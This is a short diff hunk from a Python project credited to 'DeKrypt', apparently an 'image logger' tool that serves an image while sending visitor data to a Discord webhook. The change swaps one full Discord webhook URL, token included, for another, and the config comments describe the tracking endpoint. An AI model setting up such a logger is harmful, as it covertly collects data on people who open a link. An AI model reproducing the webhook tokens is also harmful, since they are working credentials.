@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1345860174451310703/8LVDDCvKz9-cf6-fHQCKrQTLDLtZ65wwccI2vk5osvkoGDjYBG2VyZLl4CR_uc-PS5F6",
+    "webhook": "https://discord.com/api/webhooks/1346307396720525322/3c3bewvNOpe68d06UgJSK5IaO7j5VXp629OOJ5g6-GD1T14aaDvE0MA0vER9tx6pBru1",
     "image": "https://media.tenor.com/Bir5i70thlMAAAAe/dont-middle-click.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
